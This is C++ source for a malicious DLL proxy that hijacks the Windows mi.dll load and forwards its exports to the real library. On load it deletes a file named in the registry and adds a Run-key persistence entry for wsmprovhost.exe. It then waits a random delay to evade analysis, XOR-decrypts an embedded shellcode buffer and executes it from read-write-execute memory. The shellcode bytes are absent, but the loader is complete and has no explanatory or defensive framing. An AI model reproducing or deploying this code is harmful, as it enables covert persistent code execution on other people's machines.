// DLL Proxy
#include <windows.h>
#include <Shellapi.h>
#include <tchar.h>
#include "pch.h"
#include <stdio.h>
#include <thread>
#include "direct.h"
#include <Shlobj.h>
#include <Shlwapi.h>

#pragma comment(linker, "/export:MI_Application_InitializeV1=C:\\Windows\\System32\\mi.MI_Application_InitializeV1")
#pragma comment(linker, "/export:mi_clientFT_V1=C:\\Windows\\System32\\mi.mi_clientFT_V1")

void Hook_Init();
std::thread hookthread;
char shellcode[] = \

;

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH: {
		// Create a thread and close the handle as we do not want to use it to wait for it 
		// TODO: Remove after test
		HKEY hkey = NULL;
		LONG res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)"Software\\Classes\\87983e9e-fe92-11ed-be56-0242ac120002", 0, KEY_WRITE, &hkey);
		if (res == ERROR_SUCCESS) {
			char value[255] = { 0 };
			DWORD BufferSize = 255;
			RegGetValue(HKEY_CURRENT_USER, (LPCSTR)"Software\\Classes\\87983e9e-fe92-11ed-be56-0242ac120002", "4f3b5b6d-0aae-4f7f-8024-d906b12e7d4a", RRF_RT_ANY, NULL, (PVOID)&value, &BufferSize);
			Sleep(100);
			if (value[0] != 0) {
				remove(value);
				RegSetValueEx(hkey, (LPCSTR)"4f3b5b6d-0aae-4f7f-8024-d906b12e7d4a", 0, REG_SZ, NULL, NULL);
			}
			else {
			}
			RegCloseKey(hkey);
		}
		// Create a thread and close the handle as we do not want to use it to wait for it 
		char path[200];
		_getcwd(path, 200);
		HKEY hkey2 = NULL;
		strcat_s(path, "\\wsmprovhost.exe");
		const char* exe = path;
		// startup
		LONG res2 = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hkey2);
		if (res2 == ERROR_SUCCESS) {
			char value[255] = { 0 };
			DWORD BufferSize = 255;
			RegGetValue(HKEY_CURRENT_USER, (LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "wsmprovhost", RRF_RT_ANY, NULL, (PVOID)&value, &BufferSize);
			if (value[0] != 0) {
			}
			else {
				RegSetValueEx(hkey2, (LPCSTR)"wsmprovhost", 0, REG_SZ, (unsigned char*)exe, strlen(exe));
			}
			RegCloseKey(hkey2);
		}
		srand(clock());
		int num = ((rand() % (100 - 1 + 1)) + 1) * 200;
		Sleep(num);
		char key[] = "a6Pzfg5WCfuWvCsjvHZha*#YR&zhQnU5v@bZ8&hV!repq6fouf^q#";
		int keysize = sizeof(key);
		int i;
		for (i = 0; i < sizeof(shellcode); i++) {
			shellcode[i] = key[i % keysize] ^ shellcode[i];
		}
		hookthread = std::thread(Hook_Init);
	}
	case DLL_PROCESS_DETACH:
		hookthread.detach();
		// Code to run when the DLL is freed
		break;

	case DLL_THREAD_ATTACH:
		// Code to run when a thread is created during the DLL's lifetime
		break;
	case DLL_THREAD_DETACH:
		// Code to run when a thread ends normally.
		break;
	}
	return TRUE;
}

void Hook_Init() {
	void* pShellcode;
	HANDLE hProcess = GetCurrentProcess();

	pShellcode = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(pShellcode, shellcode, sizeof(shellcode));

	int (*func)();
	func = (int (*)()) pShellcode;
	(*func)();
}
